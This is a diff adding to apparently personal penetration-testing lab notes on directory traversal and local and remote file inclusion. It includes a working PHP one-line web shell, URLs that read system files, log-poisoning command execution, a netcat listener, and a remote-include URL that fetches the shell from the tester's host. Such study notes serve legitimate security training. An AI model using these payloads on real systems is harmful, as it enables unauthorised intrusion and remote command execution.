@@ -54,6 +54,27 @@ powershell -ExecutionPolicy Bypass -File Documents/admin_login.ps1    #script lo
 #Directory Traversal / Path Traversal Vulns
 ## Identifying and Exploiting Dir Travesal Vulns    #search for /etc/passwd on linux or boot.ini in win
 # we can target on Win - c:\windows\system32\drivers\etc\hosts file
+- in the vulnerable URL 10.11.0.22/menu.php?file=current_menu.php --> 10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts  --> print the content of the hosts file     ## we can read files, including those outside of the web root directory
+## File Inclusion Vulns     #not only we can read as in Dir Traversal, but we can icnlude files into the app's running code // write shell somewhere
+### Identify R/LFI vulns    // RFI easyer to Exploit than LFI
+#### Exploit LFI
+- one way is to contaminate log files and the LFI ex:to execute php code
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>     #php code // pre - preserve any linebreaks or formatting in a results that a function call // function call -> shell_exec --> executes OS command // OS command is retrieved by from cmd parameter in GET request /// one line php code let us specify an OS command via HTTP query and output the result in our browser
+#in the exercise the payload is in the log file, despite the bad HTTP request, so we can perform LFI Code Execution
+## LFI Code Execution 
+# from the previous Dir Traversal Example, we exploit:
+10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
+
+## RFI    # php apps must be cofigured --> URL include, set to "ON" //older php default is "ON", newer are "OFF"
+- start listenr - sudo nc -lvnp 80
+-in the URL:
+# start apache server hosting our evil.txt
+10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt    # on our listener we see GET /evil.txt
+#
+cat /var/www/html/evil.txt --> <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+sudo systemctl start apache2
+# exploit RFI:
+10.11.0.22/menu.php?file=http://10.11.0.4.evil.txt&cmd=ipconfig   #same results as LFI before   #very simple webshell!
 
 
 
